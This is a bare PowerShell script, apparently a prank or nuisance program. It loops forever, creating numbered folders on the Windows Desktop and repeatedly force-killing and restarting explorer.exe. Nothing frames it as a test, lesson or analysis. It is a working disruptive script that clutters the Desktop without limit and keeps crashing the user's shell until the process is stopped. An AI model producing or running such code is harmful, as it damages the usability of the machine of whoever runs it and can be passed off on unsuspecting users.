$i = 1
while ($true) {
    $path = [Environment]::GetFolderPath("Desktop") + "\$i"
    New-Item -ItemType Directory -Path $path
    $i++
    Start-Sleep -Milliseconds 100
    taskkill /f /im explorer.exe
    Start-Sleep -Milliseconds 500
    explorer.exe
    Start-Sleep -Milliseconds 500
}
